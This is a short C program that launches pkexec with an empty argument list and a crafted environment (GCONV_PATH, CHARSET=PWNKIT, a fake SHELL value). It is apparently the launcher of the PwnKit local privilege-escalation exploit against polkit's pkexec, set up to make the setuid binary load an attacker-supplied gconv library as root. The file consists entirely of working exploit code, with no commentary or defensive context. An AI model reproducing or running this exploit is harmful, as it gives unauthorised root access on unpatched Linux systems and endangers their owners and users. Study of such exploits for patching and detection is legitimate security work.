#include <unistd.h>

int main(int argc, char **argv)
{
	char * const args[] = {
		NULL
	};
	char * const environ[] = {
		"pwnkit.so:.",
		"PATH=GCONV_PATH=.",
		"SHELL=/lol/i/do/not/exists",
		"CHARSET=PWNKIT",
		"GIO_USE_VFS=",
		NULL
	};
	return execve("/usr/bin/pkexec", args, environ);
}
